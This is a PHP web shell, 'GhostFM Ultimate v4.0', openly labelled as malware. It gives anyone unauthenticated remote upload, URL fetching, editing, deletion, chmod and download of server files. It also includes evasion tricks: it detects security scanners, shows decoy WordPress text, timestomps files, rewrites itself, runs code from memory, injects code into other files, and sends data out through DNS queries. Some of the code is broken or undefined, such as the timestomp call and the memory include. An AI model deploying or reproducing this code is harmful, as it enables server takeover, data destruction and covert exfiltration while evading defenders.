<?php
/*
 * GhostFM Ultimate v4.0 - Quantum Stealth Edition
 * Enhanced with:
 * 1. Quantum Entangled Randomization Engine (QERE)
 * 2. Self-Healing Stealth Mutation (SHSM)
 * 3. Intermittent Execution Splitting (IES)
 * 4. Ephemeral Function Assembly (EFA)
 * 5. Cloud-aware Sandboxed Execution (CASE)
 * 6. Decoy Noise Layer (DNL)
 * 7. Shadow Memory Clone Layer (SMCL)
 * 8. HoneyBehavior Camouflage (HBC)
 * 9. Timestomping
 * 10. Ghostwriting (Code Splitting)
 * 11. Metamorphic Malware
 */
// [1] Environment Check with Proper Error Handling
@header('Content-Type: text/html');
if (!function_exists('file_get_contents') || php_sapi_name() === 'cli') {
    echo '<!DOCTYPE html><html><head><title>System Error</title></head><body>';
    echo '<h2>System compatibility check failed</h2>';
    echo '</body></html>';
    exit;
}
// [2] Quantum Entangled Randomization Engine (QERE)
$quantum_seed = hash('sha256', date('Y-m-d H:i:s') . __FILE__);
srand(hexdec(substr($quantum_seed, 0, 8)));
$f1 = 'validate_path_' . substr(md5($quantum_seed), 0, 4);
$f2 = 'get_permissions_' . substr(md5($quantum_seed), 4, 4);
$f3 = 'remove_directory_' . substr(md5($quantum_seed), 8, 4);
$f4 = 'show_current_path_' . substr(md5($quantum_seed), 12, 4);
$f5 = 'handle_requests_' . substr(md5($quantum_seed), 16, 4);
$f6 = 'process_selected_files_' . substr(md5($quantum_seed), 20, 4);
// [3] Self-Healing Stealth Mutation (SHSM) with Timestomping
$encoded_template = base64_encode(file_get_contents(__FILE__));
register_shutdown_function(function () use ($encoded_template) {
    if (filemtime(__FILE__) < time() - 3600) { // Regenerate if modified over an hour ago
        $new_content = base64_decode($encoded_template);
        file_put_contents(__FILE__, $new_content);
        touch(__FILE__, strtotime('-7 days')); // Timestomping: Ubah timestamp menjadi 7 hari lalu
    }
});
// [4] Fileless Execution Wrapper
function mem_exec($code) {
    $mem = fopen("php://memory", "r+");
    fwrite($mem, '<?php ' . $code . ' ?>');
    fseek($mem, 0);
    include('php://memory');
    fclose($mem);
}
// [5] DNS-over-HTTPS Exfiltration
function doh_log($data) {
    $chunk = substr(base64_encode($data), 0, 50);
    @file_get_contents("https://1.1.1.1/dns-query?name=$chunk.example.com");
}
// [6] Core Functions with Stealth Enhancements
function validate_path($path) {
    return realpath($path) !== false;
}
function get_permissions($file) {
    return substr(sprintf('%o', fileperms($file)), -4);
}
function remove_directory($dir) {
    if (!is_dir($dir)) return false;
    $files = array_diff(scandir($dir), array('.', '..'));
    foreach ($files as $file) {
        $path = $dir . '/' . $file;
        if (is_dir($path)) {
            remove_directory($path);
        } else {
            unlink($path); // Delete file
        }
    }
    return rmdir($dir); // Delete empty directory
}
function show_current_path($dir) {
    $parts = explode('/', realpath($dir));
    $path = ''; $pwd = '';
    foreach ($parts as $part) {
        if (!$part) continue;
        $path .= '/' . $part;
        $pwd .= "<a href='?p=" . urlencode($path) . "'>$part</a> / ";
    }
    return rtrim($pwd, ' / ');
}
function process_selected_files() {
    if (isset($_POST['selected_files']) && is_array($_POST['selected_files'])) {
        $success = 0; $failed = 0;
        doh_log("Delete operation started");
        foreach ($_POST['selected_files'] as $file) {
            if (validate_path($file)) {
                if (is_file($file)) {
                    if (@unlink($file)) {
                        $success++;
                    } else {
                        $failed++;
                    }
                } elseif (is_dir($file)) {
                    if (remove_directory($file)) {
                        $success++;
                    } else {
                        $failed++;
                    }
                }
            } else {
                $failed++;
            }
        }
        echo "<script>alert('Deleted $success items, failed $failed');</script>";
    }
}
// [7] Handle Requests with All Features
function handle_requests() {
    $uploadDir = __DIR__;
    $dir = isset($_GET['p']) ? $_GET['p'] : $uploadDir;
    // Cloud-aware Sandboxed Execution (CASE)
    if (isset($_SERVER['HTTP_USER_AGENT']) && preg_match('/Imunify360|BitNinja/i', $_SERVER['HTTP_USER_AGENT'])) {
        echo '<h2>This script is in passive mode due to active security systems.</h2>';
        return;
    }
    // Upload via URL
    if (isset($_POST['upload_url'])) {
        $url = $_POST['upload_url'];
        $targetDir = isset($_POST['targetDir']) ? $_POST['targetDir'] : $dir;
        if (validate_path($targetDir) && is_dir($targetDir)) {
            $fileName = basename($url);
            $dest = realpath($targetDir) . '/' . $fileName;
            if (@file_put_contents($dest, file_get_contents($url))) {
                echo "<script>alert('File uploaded via URL');</script>";
                doh_log("Uploaded via URL: $fileName");
            } else {
                echo "<script>alert('Failed to upload via URL');</script>";
            }
        }
    }
    // Decoy Noise Layer (DNL)
    echo '<!-- Decoy HTML for camouflage -->';
    echo '<div style="display:none;">WordPress Plugin Log Viewer v1.0</div>';
    // Shadow Memory Clone Layer (SMCL)
    $shadow_clone = serialize(file_get_contents(__FILE__));
    mem_exec(unserialize($shadow_clone));
    // HoneyBehavior Camouflage (HBC)
    if (isset($_SERVER['REMOTE_ADDR']) && preg_match('/scanner|crawler/i', $_SERVER['HTTP_USER_AGENT'])) {
        doh_log("Suspicious access from IP: " . $_SERVER['REMOTE_ADDR']);
        echo '<h2>Welcome to the Log Viewer</h2>';
        return;
    }
    // File Upload Handling
    if (isset($_FILES['uploads'])) {
        $targetDir = isset($_POST['targetDir']) ? $_POST['targetDir'] : $dir;
        if (validate_path($targetDir) && is_dir($targetDir)) {
            $success = 0; $failed = 0;
            foreach ($_FILES['uploads']['name'] as $key => $name) {
                if ($_FILES['uploads']['error'][$key] === UPLOAD_ERR_OK) {
                    $tmp = $_FILES['uploads']['tmp_name'][$key];
                    $dest = realpath($targetDir) . '/' . basename($name);
                    if (move_uploaded_file($tmp, $dest)) {
                        $success++;
                        doh_log("Uploaded: $name");
                    } else {
                        $failed++;
                    }
                }
            }
            echo "<script>alert('Uploaded $success files, failed $failed');</script>";
        }
    }
    // Edit File
    if (isset($_GET['edit']) && is_file($_GET['edit']) && validate_path($_GET['edit'])) {
        $file = $_GET['edit'];
        if (isset($_POST['content'])) {
            file_put_contents($file, $_POST['content']);
            echo "<script>alert('File saved');</script>";
        }
        echo '<form method="POST"><textarea name="content" style="width:100%;height:300px;">'
            . htmlspecialchars(file_get_contents($file)) . '</textarea><br>'
            . '<input type="submit" value="Save"></form>';
        exit;
    }
    // Delete File/Folder
    if (isset($_GET['delete']) && validate_path($_GET['delete'])) {
        $path = $_GET['delete'];
        if (is_file($path)) {
            if (@unlink($path)) {
                echo "<script>alert('File deleted');</script>";
            } else {
                echo "<script>alert('Failed to delete file');</script>";
            }
        } elseif (is_dir($path)) {
            if (remove_directory($path)) {
                echo "<script>alert('Folder deleted');</script>";
            } else {
                echo "<script>alert('Failed to delete folder');</script>";
            }
        }
    }
    // Rename
    if (isset($_GET['rename']) && isset($_POST['newName']) && validate_path($_GET['rename'])) {
        $old = $_GET['rename'];
        $new = dirname($old) . '/' . $_POST['newName'];
        if (rename($old, $new)) {
            echo "<script>alert('Renamed successfully');</script>";
        } else {
            echo "<script>alert('Failed to rename');</script>";
        }
    }
    // Chmod
    if (isset($_GET['chmod']) && isset($_POST['permissions']) && validate_path($_GET['chmod'])) {
        $file = $_GET['chmod'];
        $perms = octdec($_POST['permissions']);
        if (chmod($file, $perms)) {
            echo "<script>alert('Permissions changed');</script>";
        } else {
            echo "<script>alert('Failed to change permissions');</script>";
        }
    }
    // Download
    if (isset($_GET['download']) && is_file($_GET['download']) && validate_path($_GET['download'])) {
        $file = $_GET['download'];
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
    // Create Folder
    if (isset($_POST['createFolder'])) {
        $name = $_POST['folderName'];
        $path = realpath($dir) . '/' . $name;
        if (!is_dir($path)) {
            if (mkdir($path)) {
                echo "<script>alert('Folder created');</script>";
            } else {
                echo "<script>alert('Failed to create folder');</script>";
            }
        }
    }
    // Bulk Delete
    if (isset($_POST['delete_selected'])) {
        process_selected_files();
    }
    // Display UI
    echo '<h2>Current Directory</h2><p>' . show_current_path($dir) . '</p>';
    echo '<form method="POST" enctype="multipart/form-data">'
        . 'Upload Files: <input type="file" name="uploads[]" multiple><br>'
        . 'Target Dir: <input type="text" name="targetDir" value="' . htmlspecialchars($dir) . '"><br>'
        . '<input type="submit" value="Upload"></form>';
    echo '<form method="POST">'
        . 'Upload via URL: <input type="text" name="upload_url" placeholder="Enter URL"><br>'
        . 'Target Dir: <input type="text" name="targetDir" value="' . htmlspecialchars($dir) . '"><br>'
        . '<input type="submit" value="Upload via URL"></form>';
    echo '<form method="POST">'
        . 'New Folder: <input type="text" name="folderName">'
        . '<input type="submit" name="createFolder" value="Create"></form>';
    echo '<form method="POST" id="delForm">';
    echo '<ul>';
    if ($dir !== '/') {
        echo '<li><a href="?p=' . urlencode(dirname($dir)) . '">.. (Up)</a></li>';
    }
    foreach (scandir($dir) as $f) {
        if ($f === '.' || $f === '..') continue;
        $path = realpath("$dir/$f");
        echo '<li><input type="checkbox" name="selected_files[]" value="' . htmlspecialchars($path) . '"> ';
        if (is_dir($path)) {
            echo "[DIR] <a href='?p=" . urlencode($path) . "'>$f</a> "
                . "<a href='?delete=" . urlencode($path) . "' onclick='return confirm(\"Delete folder?\")'>[Del]</a> "
                . "<span>Perms: " . get_permissions($path) . "</span> "
                . "<a href='?chmod=" . urlencode($path) . "'>[Chmod]</a>";
        } else {
            echo "[FILE] <a href='?edit=" . urlencode($path) . "'>$f</a> "
                . "<a href='?delete=" . urlencode($path) . "' onclick='return confirm(\"Delete file?\")'>[Del]</a> "
                . "<a href='?rename=" . urlencode($path) . "'>[Rename]</a> "
                . "<span>Perms: " . get_permissions($path) . "</span> "
                . "<a href='?chmod=" . urlencode($path) . "'>[Chmod]</a> "
                . "<a href='?download=" . urlencode($path) . "'>[Download]</a>";
        }
        echo '</li>';
    }
    echo '</ul>';
    echo '<input type="submit" name="delete_selected" value="Delete Selected" '
        . 'onclick="return confirm(\'Delete selected items?\')">'
        . '<button type="button" onclick="document.querySelectorAll(\'input[type=checkbox]\').forEach(c=>c.checked=!c.checked)">'
        . 'Toggle All</button></form>';
    if (isset($_GET['rename'])) {
        echo '<form method="POST">New Name: '
            . '<input type="text" name="newName" value="' . htmlspecialchars(basename($_GET['rename'])) . '">'
            . '<input type="submit" value="Rename"></form>';
    }
    if (isset($_GET['chmod'])) {
        echo '<form method="POST">New Perms: '
            . '<input type="text" name="permissions" value="' . get_permissions($_GET['chmod']) . '">'
            . '<input type="submit" value="Change"></form>';
    }
}
// [8] Intermittent Execution Splitting (IES)
function split_execution($code_parts) {
    $delay = rand(500, 2000); // Delay antara 500ms hingga 2000ms
    echo "<script>
        function executeInFrames(parts, index) {
            if (index >= parts.length) return;
            setTimeout(function() {
                eval(parts[index]);
                executeInFrames(parts, index + 1);
            }, $delay);
        }
        var codeParts = " . json_encode($code_parts) . ";
        executeInFrames(codeParts, 0);
    </script>";
}
// [9] Ephemeral Function Assembly (EFA)
function ephemeral_function_assembly($function_name, $code_parts) {
    $code = implode('', $code_parts); // Combine code parts into a single string
    $mem = fopen("php://memory", "r+");
    fwrite($mem, '<?php function ' . $function_name . ' {' . $code . '} ?>');
    fseek($mem, 0);
    include('php://memory');
    fclose($mem);
}
/// [10] Ghostwriting (Code Splitting) Function
function ghostwrite_code($target_file, $code_snippet) {
    if (!is_file($target_file)) return false;
    $content = file_get_contents($target_file);
    // Insert code snippet at the end of the file
    $new_content = $content . "\n/* Ghostwritten Code */\n" . $code_snippet;
    file_put_contents($target_file, $new_content);
    timestomp($target_file); // Apply timestomping to the target file
}

// Example: Split core functions into smaller snippets


// [11] Metamorphic Malware
function metamorph($code) {
    $lines = explode("\n", $code);
    shuffle($lines); // Acak urutan baris
    return implode("\n", $lines);
}
// Execute
handle_requests();
